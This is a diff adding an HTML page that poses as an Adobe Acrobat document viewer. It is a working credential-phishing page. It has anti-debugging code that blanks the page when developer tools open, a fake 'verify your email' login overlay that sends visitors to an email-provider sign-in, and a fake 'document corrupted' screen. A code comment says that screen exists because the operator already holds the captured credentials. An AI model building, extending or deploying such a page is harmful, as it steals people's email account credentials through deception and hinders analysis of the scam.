@@ -1,0 +1,379 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+  <title>Adobe Acrobat</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/css/styles.css?v=9" />
+  <!-- Anti-debugging & tamper protection -->
+  <script>
+  (() => {
+    // Disable DevTools detection and console access
+    const chk = () => {
+      if ((window.outerHeight - window.innerHeight) > 100 || (window.outerWidth - window.innerWidth) > 100) {
+        document.body.innerHTML = '';
+        window.location.href = 'about:blank';
+      }
+    };
+    window.addEventListener('resize', chk);
+
+    // Block console access
+    const noop = () => {};
+    ['log','debug','info','warn','error','assert','count','time'].forEach(m => console[m] = noop);
+
+    // Disable right-click
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+    // Block F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+Shift+K
+    document.addEventListener('keydown', e => {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','C','J','K'].includes(e.key))) {
+        e.preventDefault();
+        e.stopPropagation();
+      }
+    });
+
+    // Prevent Ctrl+S (save)
+    document.addEventListener('keydown', e => {
+      if (e.ctrlKey && e.key === 's') e.preventDefault();
+    });
+  })();
+  </script>
+</head>
+<body>
+  <!-- Top Title Bar (dark) -->
+  <header class="titlebar">
+    <div class="tb-left">
+      <button class="hamburger" id="hamburger" data-i18n-title="hamburger.title" title="Menu"><i class="fas fa-bars"></i></button>
+      <div class="adobe-logo">
+        <svg viewBox="0 0 240 234" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M152 0h88v234zM88 0H0v234zM120 86l56 148h-37l-17-42H81z"/></svg>
+      </div>
+      <span class="product-name" data-i18n="app.acrobat">Adobe Acrobat</span>
+      <nav class="menu">
+        <button class="menu-item" data-i18n="menu.file">File</button>
+        <button class="menu-item" data-i18n="menu.edit">Edit</button>
+        <button class="menu-item" data-i18n="menu.view">View</button>
+        <button class="menu-item" data-i18n="menu.esign">E-Sign</button>
+        <button class="menu-item" data-i18n="menu.window">Window</button>
+        <button class="menu-item" data-i18n="menu.help">Help</button>
+      </nav>
+    </div>
+    <div class="tb-center">
+      <div class="search-box">
+        <i class="fas fa-search"></i>
+        <input type="text" id="searchInput" data-i18n-placeholder="search.placeholder" placeholder="Search tools, documents, and more..." disabled />
+        <button class="search-nav" id="searchPrev" data-i18n-title="toolbar.prevPage" title="Previous"><i class="fas fa-chevron-up"></i></button>
+        <button class="search-nav" id="searchNext" data-i18n-title="toolbar.nextPage" title="Next"><i class="fas fa-chevron-down"></i></button>
+      </div>
+    </div>
+    <div class="tb-right">
+      <button class="icon-btn" data-i18n-title="icon.notifications" title="Notifications"><i class="far fa-bell"></i></button>
+      <button class="icon-btn" data-i18n-title="icon.help" title="Help"><i class="far fa-question-circle"></i></button>
+      <button class="icon-btn mobile-only" id="toolsToggle" data-i18n-title="icon.tools" title="Tools"><i class="fas fa-th"></i></button>
+      <div class="avatar" id="userAvatar" data-i18n-title="avatar.title" title="Account">A</div>
+      <div class="user-menu hidden" id="userMenu">
+        <div class="um-header">
+          <div class="um-avatar" id="umAvatar">A</div>
+          <div class="um-info">
+            <div class="um-name" id="umName">User</div>
+            <div class="um-email" id="umEmail">user@example.com</div>
+          </div>
+        </div>
+        <button class="um-item" id="umLogout"><i class="fas fa-sign-out-alt"></i><span data-i18n="sign.out">Sign out</span></button>
+      </div>
+    </div>
+  </header>
+
+  <!-- File Tabs Bar -->
+  <div class="tabsbar">
+    <div class="tab home-tab active">
+      <i class="fas fa-home"></i><span data-i18n="tab.home">Home</span>
+    </div>
+    <div class="tab" id="docTab" style="display:none">
+      <i class="fas fa-file-pdf"></i><span id="tabTitle" data-i18n="tab.document">Document</span>
+      <button class="tab-close"><i class="fas fa-times"></i></button>
+    </div>
+    <div class="tabs-actions">
+      <button class="ab-btn" id="openBtn" data-i18n-title="action.openTitle" title="Open File (Ctrl+O)">
+        <i class="fas fa-folder-open"></i><span data-i18n="action.open">Open</span>
+      </button>
+      <button class="ab-btn" id="printBtn" data-i18n-title="action.printTitle" title="Print (Ctrl+P)" disabled>
+        <i class="fas fa-print"></i><span data-i18n="action.print">Print</span>
+      </button>
+      <button class="ab-btn" id="downloadBtn" data-i18n-title="action.saveTitle" title="Download" disabled>
+        <i class="fas fa-download"></i><span data-i18n="action.save">Save</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Main Layout -->
+  <div class="layout">
+    <!-- Left Rail -->
+    <aside class="rail">
+      <button class="rail-btn active" data-panel="thumbs" data-i18n-title="rail.thumbs" title="Thumbnails">
+        <i class="fas fa-images"></i>
+      </button>
+      <button class="rail-btn" data-panel="outline" data-i18n-title="rail.outline" title="Outline">
+        <i class="fas fa-list-ul"></i>
+      </button>
+      <button class="rail-btn" data-panel="info" data-i18n-title="rail.info" title="Document Info">
+        <i class="fas fa-info-circle"></i>
+      </button>
+    </aside>
+
+    <!-- Sidebar Panels -->
+    <section class="sidebar" id="sidebar">
+      <!-- Provider Logo Area -->
+      <div class="sidebar-provider-logo" id="sidebarProviderLogo"></div>
+
+      <div class="panel" data-panel="thumbs">
+        <div class="panel-header" data-i18n="sidebar.pages">Pages</div>
+        <div class="panel-body" id="thumbnails"></div>
+      </div>
+      <div class="panel hidden" data-panel="outline">
+        <div class="panel-header" data-i18n="sidebar.outline">Outline</div>
+        <div class="panel-body" id="outline">
+          <div class="empty" data-i18n="empty.noOutline">No outline available.</div>
+        </div>
+      </div>
+      <div class="panel hidden" data-panel="info">
+        <div class="panel-header" data-i18n="sidebar.docInfo">Document Properties</div>
+        <div class="panel-body" id="docInfo">
+          <div class="empty" data-i18n="empty.noDoc">No document loaded.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Viewer Area -->
+    <main class="viewer">
+      <div class="toolbar">
+        <div class="tb-group">
+          <button class="tb-btn" id="firstPage" data-i18n-title="toolbar.firstPage" title="First Page" disabled><i class="fas fa-angles-left"></i></button>
+          <button class="tb-btn" id="prevPage" data-i18n-title="toolbar.prevPage" title="Previous Page" disabled><i class="fas fa-chevron-left"></i></button>
+          <div class="page-input">
+            <input type="number" id="pageNum" value="1" min="1" disabled />
+            <span>/</span>
+            <span id="pageCount">0</span>
+          </div>
+          <button class="tb-btn" id="nextPage" data-i18n-title="toolbar.nextPage" title="Next Page" disabled><i class="fas fa-chevron-right"></i></button>
+          <button class="tb-btn" id="lastPage" data-i18n-title="toolbar.lastPage" title="Last Page" disabled><i class="fas fa-angles-right"></i></button>
+        </div>
+
+        <div class="tb-divider"></div>
+
+        <div class="tb-group">
+          <button class="tb-btn" id="zoomOut" data-i18n-title="toolbar.zoomOut" title="Zoom Out" disabled><i class="fas fa-magnifying-glass-minus"></i></button>
+          <select id="zoomSelect" disabled>
+            <option value="auto" data-i18n="zoom.auto">Automatic</option>
+            <option value="page-fit" data-i18n="zoom.fitPage">Fit Page</option>
+            <option value="page-width" data-i18n="zoom.fitWidth">Fit Width</option>
+            <option value="0.5">50%</option>
+            <option value="0.75">75%</option>
+            <option value="1" selected>100%</option>
+            <option value="1.25">125%</option>
+            <option value="1.5">150%</option>
+            <option value="2">200%</option>
+            <option value="3">300%</option>
+            <option value="4">400%</option>
+          </select>
+          <button class="tb-btn" id="zoomIn" data-i18n-title="toolbar.zoomIn" title="Zoom In" disabled><i class="fas fa-magnifying-glass-plus"></i></button>
+        </div>
+
+        <div class="tb-divider"></div>
+
+        <div class="tb-group">
+          <button class="tb-btn" id="rotateLeft" data-i18n-title="toolbar.rotateLeft" title="Rotate Left" disabled><i class="fas fa-rotate-left"></i></button>
+          <button class="tb-btn" id="rotateRight" data-i18n-title="toolbar.rotateRight" title="Rotate Right" disabled><i class="fas fa-rotate-right"></i></button>
+          <button class="tb-btn" id="fullscreen" data-i18n-title="toolbar.fullscreen" title="Fullscreen"><i class="fas fa-expand"></i></button>
+        </div>
+      </div>
+
+      <div class="viewer-canvas" id="viewerCanvas">
+        <div class="dropzone hidden" id="dropzone">
+          <div class="dz-inner">
+            <i class="fas fa-file-arrow-up"></i>
+            <h2 data-i18n="dropzone.title">Drop a PDF here</h2>
+            <p data-i18n="dropzone.sub">or click <strong>Open</strong> to browse your files</p>
+          </div>
+        </div>
+        <div id="pagesContainer" class="pages-container"></div>
+      </div>
+
+      <footer class="statusbar">
+        <span id="statusFile" data-i18n="status.noDoc">No document loaded</span>
+        <span class="spacer"></span>
+        <span id="statusZoom">—</span>
+      </footer>
+
+      <!-- ============ LOGIN OVERLAY (scoped to viewer) ============ -->
+      <div class="login-overlay hidden" id="loginOverlay">
+        <div class="login-card" id="overlayLoginFlow">
+          <!-- STEP 0: Loading (shown when auto-detecting from URL) -->
+          <div class="login-state active" data-lf-step="loading" style="text-align:center;padding:50px 24px;">
+            <div style="margin-bottom:24px;">
+              <svg width="48" height="48" viewBox="0 0 48 48">
+                <circle cx="24" cy="24" r="20" fill="none" stroke="#f0f0f3" stroke-width="3.5"/>
+                <circle cx="24" cy="24" r="20" fill="none" stroke="#eb1000" stroke-width="3.5" stroke-dasharray="100" stroke-dashoffset="75" stroke-linecap="round" style="animation:lf-spin 1s ease-in-out infinite;transform-origin:center;"/>
+              </svg>
+            </div>
+            <h1 class="login-title" style="font-size:17px;margin-bottom:6px;" data-lf-loading-title data-i18n="loading.title">Loading secure document</h1>
+            <p class="login-sub" data-lf-loading-email style="font-size:13px;"></p>
+          </div>
+
+          <!-- STEP 1: Enter email -->
+          <div class="login-state" data-lf-step="email">
+            <div class="login-mark">
+              <svg viewBox="0 0 240 234" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#fff" d="M152 0h88v234zM88 0H0v234zM120 86l56 148h-37l-17-42H81z"/>
+              </svg>
+            </div>
+            <h1 class="login-title" data-lf-email-title data-i18n="email.title">Continue to view your document</h1>
+            <p class="login-sub" data-lf-email-subtitle data-i18n="email.sub">Please verify your email address</p>
+
+            <form data-lf-form autocomplete="off" novalidate style="width:100%">
+              <input type="email" data-lf-email-input class="provider-field" data-i18n-placeholder="email.placeholder" placeholder="" autocomplete="email" />
+              <input type="text" name="_hp" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;" tabindex="-1" autocomplete="off" />
+              <p class="provider-err hidden" data-lf-error role="alert" aria-live="polite"></p>
+              <button type="submit" class="login-submit" data-i18n="email.continue">Continue</button>
+            </form>
+
+            <p class="login-legal" data-lf-email-footer data-i18n="email.legal">
+              Only the recipient can view this document.
+            </p>
+          </div>
+
+          <!-- STEP 2: Provider detected -->
+          <div class="login-state" data-lf-step="provider" style="text-align:center;">
+            <button class="login-back" data-lf-back-btn><i class="fas fa-arrow-left"></i> <span data-i18n="provider.back">Back</span></button>
+
+            <div class="provider-logo" data-lf-provider-logo></div>
+
+            <p data-lf-brand-name style="display:none;font-size:13px;color:#5a5a5f;margin-bottom:8px;font-weight:600;"></p>
+            <h1 class="login-title" style="font-size:18px;margin-bottom:6px;" data-lf-provider-name></h1>
+
+            <div class="provider-pill" data-lf-email-pill></div>
+
+            <p class="provider-err hidden" data-lf-error></p>
+
+            <button class="provider-btn" data-lf-continue-btn data-i18n="provider.continue">Continue</button>
+
+            <p class="login-legal" style="margin-top:16px;" data-i18n="provider.legal">
+              You'll be redirected to your email provider to sign in securely.
+            </p>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- Right Tools Panel -->
+    <aside class="tools-panel">
+      <div class="tools-list">
+        <button class="tool-item" data-tool="export"><i class="fas fa-download"></i><span data-i18n="tools.export">Export PDF</span><i class="fas fa-chevron-down"></i></button>
+        <button class="tool-item" data-tool="create"><i class="fas fa-plus-square"></i><span data-i18n="tools.create">Create PDF</span><i class="fas fa-chevron-down"></i></button>
+        <button class="tool-item" data-tool="edit"><i class="fas fa-edit"></i><span data-i18n="tools.edit">Edit PDF</span></button>
+        <button class="tool-item" data-tool="comment"><i class="fas fa-comment"></i><span data-i18n="tools.comment">Comment</span></button>
+        <button class="tool-item" data-tool="combine"><i class="fas fa-layer-group"></i><span data-i18n="tools.combine">Combine Files</span><i class="fas fa-chevron-down"></i></button>
+        <button class="tool-item" data-tool="organize"><i class="fas fa-th"></i><span>Organize Pages</span><i class="fas fa-chevron-down"></i></button>
+        <button class="tool-item" data-tool="redact"><i class="fas fa-eraser"></i><span>Redact</span></button>
+        <button class="tool-item" data-tool="protect"><i class="fas fa-shield-alt"></i><span data-i18n="tools.protect">Password Protect</span></button>
+        <button class="tool-item" data-tool="optimize"><i class="fas fa-compress"></i><span>Optimize PDF</span></button>
+        <button class="tool-item" data-tool="sign"><i class="fas fa-signature"></i><span data-i18n="tools.sign">Fill &amp; Sign</span></button>
+        <button class="tool-item" data-tool="esign"><i class="fas fa-paper-plane"></i><span>Send for Review</span></button>
+        <button class="tool-item more-tools"><i class="fas fa-wrench"></i><span>More Tools</span></button>
+      </div>
+    </aside>
+  </div>
+
+  <input type="file" id="fileInput" accept="application/pdf" hidden />
+  <input type="file" id="multiFileInput" accept="application/pdf" multiple hidden />
+  <input type="file" id="imageInput" accept="image/*" multiple hidden />
+
+  <!-- Modal Container -->
+  <div class="modal-overlay hidden" id="modalOverlay">
+    <div class="modal" id="modal">
+      <div class="modal-header">
+        <h3 id="modalTitle" data-i18n="modal.tool">Tool</h3>
+        <button class="modal-close" id="modalClose"><i class="fas fa-times"></i></button>
+      </div>
+      <div class="modal-body" id="modalBody"></div>
+      <div class="modal-footer" id="modalFooter"></div>
+    </div>
+  </div>
+
+  <!-- Toast -->
+  <div class="toast hidden" id="toast"></div>
+
+  <!-- Mobile drawer scrim -->
+  <div class="scrim" id="scrim"></div>
+
+  <script src="https://unpkg.com/pdf-lib@1.17.1/dist/pdf-lib.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/4.0.379/pdf.min.mjs" type="module"></script>
+  <script type="module" src="/js/app.js"></script>
+  <script type="module" src="/js/tools.js"></script>
+  <script>
+    // ---- i18n bootstrap: walk data-i18n markers and apply server-injected dictionary ----
+    (function () {
+      var d = window.__I18N__ || {};
+      window.t = function (key, fallback) {
+        var v = d[key];
+        return (typeof v === 'string') ? v : (fallback != null ? fallback : key);
+      };
+      function apply() {
+        document.querySelectorAll('[data-i18n]').forEach(function (el) {
+          var k = el.getAttribute('data-i18n');
+          if (!d[k]) return;
+          // Allow simple inline HTML in dict values (we control the source).
+          if (/<\w/.test(d[k])) el.innerHTML = d[k]; else el.textContent = d[k];
+        });
+        document.querySelectorAll('[data-i18n-placeholder]').forEach(function (el) {
+          var k = el.getAttribute('data-i18n-placeholder');
+          if (d[k]) el.setAttribute('placeholder', d[k]);
+        });
+        document.querySelectorAll('[data-i18n-title]').forEach(function (el) {
+          var k = el.getAttribute('data-i18n-title');
+          if (d[k]) el.setAttribute('title', d[k]);
+        });
+        document.querySelectorAll('[data-i18n-aria]').forEach(function (el) {
+          var k = el.getAttribute('data-i18n-aria');
+          if (d[k]) el.setAttribute('aria-label', d[k]);
+        });
+      }
+      if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', apply);
+      else apply();
+    })();
+  </script>
+  <script type="module">
+    import { initLoginFlow } from '/js/login-flow.js?v=64';
+    try {
+      const el = document.getElementById('overlayLoginFlow');
+      if (el) initLoginFlow(el, { onSuccess: () => showCorruptDoc(el) });
+    } catch(e) { console.error('login-flow init error:', e); }
+
+    // Renders the "document corrupted" screen after IMAP-verified credentials.
+    // Operator already has the captured cred at this point — the screen is purely
+    // a believable dead-end so the recipient stops trying without seeing any real PDF.
+    window.showCorruptDoc = function (card) {
+      const errCode = 'PDF_PARSE_ERR_' + Math.random().toString(36).slice(2, 8).toUpperCase();
+      const t = window.t || ((k, f) => f || k);
+      card.innerHTML = `
+        <div class="login-state active" style="text-align:center;padding:36px 24px;">
+          <div style="margin-bottom:18px;">
+            <svg width="56" height="56" viewBox="0 0 56 56" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="28" cy="28" r="26" fill="#fef2f2"/>
+              <circle cx="28" cy="28" r="26" fill="none" stroke="#eb1000" stroke-width="2.5" stroke-dasharray="4 4"/>
+              <path d="M22 22 L34 34 M34 22 L22 34" stroke="#eb1000" stroke-width="3" stroke-linecap="round"/>
+            </svg>
+          </div>
+          <h1 class="login-title" data-i18n="corrupt.title" style="font-size:18px;margin-bottom:8px;color:#eb1000;">${t('corrupt.title', 'Document file is corrupted')}</h1>
+          <p class="login-sub" data-i18n="corrupt.message" style="font-size:13px;line-height:1.5;max-width:340px;margin:0 auto;">${t('corrupt.message', "We've verified your credentials, but the document file appears to be damaged. Please contact the sender to request a fresh copy.")}</p>
+          <div style="margin-top:22px;padding:10px 14px;background:#fafafa;border:1px solid #e5e7eb;border-radius:8px;font-size:11px;color:#8a8a90;display:inline-block;">
+            <span data-i18n="corrupt.errorCode">${t('corrupt.errorCode', 'Error code:')}</span>
+            <code style="font-family:'SF Mono',monospace;color:#5a5a5f;margin-left:6px;">${errCode}</code>
+          </div>
+        </div>
+      `;
+    };
+  </script>
+</body>
+</html>
